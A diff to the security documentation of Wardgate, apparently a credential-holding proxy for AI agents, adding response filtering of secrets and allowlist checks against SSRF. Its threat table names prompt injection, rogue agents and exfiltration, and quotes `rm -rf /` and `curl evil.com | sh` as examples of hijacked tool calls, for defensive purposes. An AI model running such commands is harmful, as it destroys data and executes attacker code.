@@ -23,7 +23,9 @@ Wardgate is a security proxy that sits between AI agents and external services. 
 | Prompt injection attacks | Agent can only perform allowed actions |
 | Rogue agent behavior | All requests logged and rate-limited |
 | Data exfiltration | Policies restrict what data can be accessed |
+| Sensitive data in responses | Response filtering blocks or redacts OTP codes, API keys, etc. -- including SSE streams |
 | Accidental destructive actions | Require approval for sensitive operations or block them |
+| SSRF via dynamic upstreams | Agent-provided upstream URLs validated against allowlist with scheme, host, and path checks |
 | Tool call hijacking (e.g., `rm -rf /`, `curl evil.com \| sh`) | Conclaves isolate execution and evaluate each command against policy |
 
 ### What We Don't Protect Against
@@ -52,6 +54,8 @@ Multiple layers protect your credentials:
 │  • Validates agent identity                     │
 │  • Evaluates policy rules                       │
 │  • Rate limits requests                         │
+│  • Validates dynamic upstream targets           │
+│  • Filters sensitive data from responses/SSE    │
 │  • Logs everything                              │
 └────────────────────┬────────────────────────────┘
                      │ Wardgate injects real credentials
@@ -69,6 +73,8 @@ Agents only get access to what they need:
 - Restrict methods (GET only, no DELETE)
 - Limit paths (only `/tasks`, not `/admin`)
 - Time-bound access (business hours only)
+- Dynamic upstreams limited to allowlisted host patterns
+- Response filtering removes sensitive data before it reaches the agent
 
 ### 3. Explicit Over Implicit
 
@@ -117,13 +123,27 @@ Credentials never leave the gateway:
    │ ──► Under limit, proceed                    │
    └─────────────────────────────────────────────┘
 
-5. Inject credentials and forward
+5. Resolve upstream target
+   ┌─────────────────────────────────────────────┐
+   │ Static upstream from config?       ──► Yes  │
+   │ Or: X-Wardgate-Upstream header?             │
+   │   Validate against allowed_upstreams globs  │
+   └─────────────────────────────────────────────┘
+
+6. Inject credentials and forward
    ┌─────────────────────────────────────────────┐
    │ GET https://api.todoist.com/rest/v2/tasks   │
    │ Authorization: Bearer <real-api-key>        │
    └─────────────────────────────────────────────┘
 
-6. Log and return response
+7. Filter response and return
+   ┌─────────────────────────────────────────────┐
+   │ Scan for sensitive data (OTPs, API keys)    │
+   │ SSE streams: filter per-message in realtime │
+   │ Action: block, redact, or pass through      │
+   └─────────────────────────────────────────────┘
+
+8. Log
    ┌─────────────────────────────────────────────┐
    │ Log: agent=myagent endpoint=todoist-api     │
    │       method=GET path=/tasks decision=allow │
